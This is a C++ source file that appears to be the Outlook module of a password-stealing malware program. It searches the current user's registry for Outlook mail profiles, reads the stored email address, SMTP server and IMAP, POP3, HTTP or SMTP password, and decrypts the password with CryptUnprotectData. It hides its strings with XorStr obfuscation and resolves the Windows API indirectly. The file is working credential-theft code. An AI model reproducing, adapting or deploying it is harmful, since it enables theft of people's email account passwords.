#include "Outlook.h"

string Outlook::ConvertUnicodeVectorToString(const vector<byte>& vec)
{
	string res;
	if (!vec.empty())
	{
		if (vec[1] == 0)
		{
			for (size_t i = 0; i < vec.size(); ++i)
			{
				if (!(i & 1))
				{
					res += vec[i];
					if (vec[i] == 0)
						break;
				}
			}
		}
		else
		{
			for (size_t i = 0; i < vec.size(); ++i)
				res += vec[i];
		}
	}

	return res;
}

vector<byte> Outlook::OutlookDecrypt(const vector<byte>& bytes)
{
	if (bytes.empty())
		return vector<byte>();

	vector<byte> result(bytes.size() - 1);
	size_t srcOffset = 1, count = bytes.size() - 1, dstOffset = 0;
	while (count--)
		result[dstOffset++] = bytes[srcOffset++];

	DATA_BLOB in, out;
	in.pbData = (BYTE*)result.data();
	in.cbData = result.size() + 1;

	if (API(CRYPT32, CryptUnprotectData)(&in, NULL, 0, 0, 0, 0, &out))
	{
		result.clear();
		for (DWORD i = 0; i < out.cbData; ++i)
			result.push_back(out.pbData[i]);
		return result;
	}

	return vector<byte>();
}

PassData Outlook::ExtractOutlook(HKEY hProfile)
{
	string sEmail, sSmtpServer;

	vector<byte> vecEmail, vecSmtpServer;
	vector<byte> vecPassword;

	Utils::GetStringRegKeyBytes(hProfile, XorStr("Email"), vecEmail, vector<byte>());
	Utils::GetStringRegKeyBytes(hProfile, XorStr("SMTP Server"), vecSmtpServer, vector<byte>());

	sEmail = ConvertUnicodeVectorToString(vecEmail);
	if (!sEmail.empty())
	{
		sSmtpServer = ConvertUnicodeVectorToString(vecSmtpServer);

		Utils::GetStringRegKeyBytes(hProfile, XorStr("IMAP Password"), vecPassword, vector<byte>());
		if (vecPassword.empty())
		{
			Utils::GetStringRegKeyBytes(hProfile, XorStr("POP3 Password"), vecPassword, vector<byte>());
			if (vecPassword.empty())
			{
				Utils::GetStringRegKeyBytes(hProfile, XorStr("HTTP Password"), vecPassword, vector<byte>());
				if (vecPassword.empty())
					Utils::GetStringRegKeyBytes(hProfile, XorStr("SMTP Password"), vecPassword, vector<byte>());
			}
		}
	}

	PassData passData;
	if (!vecPassword.empty())
	{
		string password = ConvertUnicodeVectorToString(OutlookDecrypt(vecPassword));
		passData.Soft = XorStr("Outlook");
		passData.Host = sSmtpServer;
		passData.Login = sEmail;
		passData.Pass = password;
	}

	return passData;
}

void Outlook::OutlookScan(HKEY hStart, vector<PassData> data, string prev_name)
{
	char* buff = new char[1024];
	DWORD index = 0;

	LSTATUS stat = API(ADVAPI32, RegEnumKeyA)(hStart, index, buff, 1024);
	while (stat == ERROR_SUCCESS)
	{
		HKEY hFull;
		API(ADVAPI32, RegOpenKeyA)(HKEY_CURRENT_USER, string(prev_name + '\\' + (string)buff).c_str(), &hFull);
		if (hFull != nullptr)
		{
			if (string(buff) == XorStr("9375CFF0413111d3B88A00104B2A6676"))
			{
				DWORD dwProfileIndex = 0;
				char* profileName = new char[256];
				LSTATUS profileStat = API(ADVAPI32, RegEnumKeyA)(hFull, dwProfileIndex, profileName, 256);
				while (profileStat == ERROR_SUCCESS)
				{
					HKEY hProfile;
					if (API(ADVAPI32, RegOpenKeyA)(hFull, profileName, &hProfile) == ERROR_SUCCESS && hProfile != nullptr)
					{
						data.push_back(ExtractOutlook(hProfile));
						API(ADVAPI32, RegCloseKey)(hProfile);
					}

					dwProfileIndex++;
					profileStat = API(ADVAPI32, RegEnumKeyA)(hFull, dwProfileIndex, profileName, 256);
				}

				if (profileName)
					delete[] profileName;
			}
			else
				OutlookScan(hFull, data, prev_name + '\\' + (string)buff);

			API(ADVAPI32, RegCloseKey)(hFull);
		}

		index++;
		stat = API(ADVAPI32, RegEnumKeyA)(hStart, index, buff, 1024);
	}

	if (buff)
		delete[] buff;
}

void Outlook::RunOutlookScan(string entry, vector<PassData> data)
{
	HKEY hStart;
	if (API(ADVAPI32, RegOpenKeyA)(HKEY_CURRENT_USER, entry.c_str(), &hStart) == ERROR_SUCCESS && hStart)
	{
		OutlookScan(hStart, data, entry);
		API(ADVAPI32, RegCloseKey)(hStart);
	}
}

vector<PassData> Outlook::Grab()
{
	vector<PassData> data;;
	RunOutlookScan(XorStr("Software\\Microsoft\\Office"), data);
	RunOutlookScan(XorStr("Software\\Microsoft\\Windows Messaging Subsystem\\Profiles"), data);
	RunOutlookScan(XorStr("Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows Messaging Subsystem\\Profiles"), data);

	return data;
}